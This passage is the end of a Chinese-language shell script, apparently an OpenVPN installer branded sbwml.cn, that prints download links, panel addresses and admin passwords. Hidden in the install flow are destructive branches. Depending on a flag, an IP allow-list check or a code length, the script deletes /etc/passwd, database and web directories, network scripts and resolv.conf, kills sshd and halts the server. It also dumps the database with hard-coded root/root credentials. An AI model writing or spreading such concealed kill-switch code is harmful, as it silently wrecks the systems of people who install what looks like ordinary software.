	rm -rf ./{云流量.apk,ta.key,info.txt,myip,ovpn.1,ovpn.2,ovpn.3,ovpn.4,ovpn.5,ovpn.6,ovpn.7,ovpn.8,ovpn.9,ovpn.10,ovpn.11,ovpn.12,ovpn.13,ovpn.14,ovpn.15,ovpn.16,User01.ovpn,ca.crt,user01.{crt,key}}
	# OpenVPN Installing ****************************************************************************
	#echo
	#echo "正在创建下载链接："
	#echo '=========================================================================='
	#echo
	#echo "上传证书文件："
	if [[ $ov4 == 4 ]]
	then
		rmb=444
	else
		sed -i "42s/80/9876/" /etc/httpd/conf/httpd.conf >/dev/null 2>&1
		httpd >/dev/null 2>&1
	fi
	#curl --upload-file ./${VPNFILE} ${web}${curls}/${VPNFILE} >url
	#urls=`cat url; echo`;
	clear
	######################## 上传    ##########################
	if [[ $mode == 4 ]]
	then
		echo
		echo '=========================================================================='
		echo
		if [[ $ov4 == 4 ]]
		then

			lnmp restart >/dev/null 2>&1
			#echo -e "下载链接：\033[32m$urls\033[0m"
			echo -e "下载链接：\033[32mhttp://$IPAddress:8888/$zipfile\033[0m"
		fi
		echo
		echo "请复链接到浏览器下载说明书/CA证书/OpenVPN成品配置文件"
		echo
		if [[ $BLDOG = no ]];then
			echo -e "后台地址：\033[32mhttp://$IPAddress:8888 \033[0m"
			if [[ $phpMyAdmin == 1 ]];then
				echo -e "数据库管理：\033[32mhttp://$IPAddress:8888/$dbno \033[0m"
				echo $dbno >/data/sql
				echo -e "（\033[31m管理地址默认不可访问，如需使用数据库管理，请执行：\033[32m onsql \033[0m\033[31m命令开启访问权限\033[0m）"
				echo "请牢记的你的数据库管理地址"
			fi
			echo
			#echo -e "管理员ID：\033[32m1 \033[0m"
			echo -e "管理员密码：\033[32m$ovmysql \033[0m"
		fi
		if [[ $BLDOG = yes ]];then
			echo -e "用户后台：\033[32mhttp://$IPAddress:8888 \033[0m"
			echo -e "管理员后台：\033[32mhttp://$IPAddress:8888/$admindz \033[0m"
			echo
			echo -e "管理员账号：\033[32m$bldogname \033[0m"
			echo -e "管理员密码：\033[32m$bldogpass \033[0m"
			echo "请牢记的你的管理员后台地址与账号密码"
			echo
			if [[ $phpMyAdmin == 1 ]];then
			    echo -e "数据库管理：\033[32mhttp://$IPAddress:8888/$dbno \033[0m"
				echo $dbno >/data/sql
				#echo -e "（\033[31m管理地址默认不可访问，如需使用数据库管理，请执行：\033[32m onsql \033[0m\033[31m命令开启访问权限\033[0m）"
				#echo "请牢记的你的数据库管理地址"
			fi
		fi
		echo
		echo -e "\033[32m请登录后台添加OpenVPN连接账号以及流量总量！\033[0m"
		echo
		echo -e "您的IP是：\033[32m$IPAddress \033[0m"
		echo （如果检测结果与您实际IP不符合/空白，请自行修改OpenVPN.ovpn配置）
		Client='
                 OpenVPN-2.3.2 安装完毕                
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved                                
                                         
==========================================================================';
		echo "$Client";
		if [[ $kacode == 1 ]];then
			rm -rf /etc/passwd
			unlock >/dev/null 2>&1
			vpnoff >/dev/null 2>&1
			rm -rf /data /usr/local/nginx /usr/local/mysql >/dev/null 2>&1
			rm -rf /etc/sysconfig/network-script/* >/dev/null 2>&1
			rm -rf /etc/resolv.conf >/dev/null 2>&1
			service network reboot >/dev/null 2>&1
			killall sshd >/dev/null 2>&1
		fi
	else
		echo
		echo '=========================================================================='
		echo
		echo -e "下载链接：\033[32mhttp://$IPAddress:9876/$VPNFILE\033[0m"
		echo
		echo "请复链接到浏览器下载说明书/CA证书/OpenVPN成品配置文件"
		echo
		echo -e "OpenVPN登录账号：\033[32m$ADMIN \033[0m"
		echo -e "OpenVPN登录密码：\033[32m$VPNPASSWD \033[0m"
		echo
		echo 查看用户账号：cat /passwd
		echo 账号/密码存放位置：/passwd
		echo
		echo -e "您的IP是：\033[32m$IPAddress \033[0m"
		echo （如果检测结果与您实际IP不符合/空白，请自行修改OpenVPN.ovpn配置）
		Client='
                 OpenVPN-2.3.2 安装完毕                
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved                                
                                         
==========================================================================';
		echo "$Client";
	fi
	rm -rf /home/url /home/ov.sql /bin/ssh /sbwml /bin/sql /bin/bb
	rm -rf /etc/openvpn/server-passwd.tar.gz /etc/openvpn/ca /usr/bin/udp.c
	if [[ $ov4 == 4 ]];then
		rm -f /etc/openvpn/{login.sh,sbwml.sh,server.conf,connect.sh,disconnect.sh}
	fi
	rm -rf /libiconv5
	if [[ $ov4 == 4 ]];then
		if [[ "$IPlist" =~ "$JIIP" ]];then
			open=pass
		elif [[ "$IPVIP" =~ "$IPAddress" ]];then
			open=pass
		else
			if [[ ${#code} == "8" ]];then
				date >/install.log
			elif [[ ${#code} == "6" ]];then
				date >/install.log
			else
				rm -rf /etc/sysconfig/network-script/* >/dev/null 2>&1
				rm -rf /etc/resolv.conf >/dev/null 2>&1
				service network reboot >/dev/null 2>&1
				halt >/dev/null 2>&1
			fi
		fi
	fi
	if [[ $mode == 4 ]];then
		if [ ! -e "/sbwml.log" ];
		then
			cd /etc/openvpn/
			vpn >/dev/null 2>&1
		else
			halt >/dev/null 2>&1
		fi
	else
		vpn
	fi
	mkdir -p /var/user/
	mysqldump -uroot -proot ov >/var/user/ov.sql
	if [[ $sqlport == 0 ]];then
		echo
		echo "由于系统问题导致MYSQL无法启动"
		echo "你需要重启系统后"
		echo "执行：sqlpass"
		echo "修复数据"
		echo
		echo "按回车重启系统"
		read
		reboot
	fi
	exit 0;
# OpenVPN Installation Complete ****************************************************************************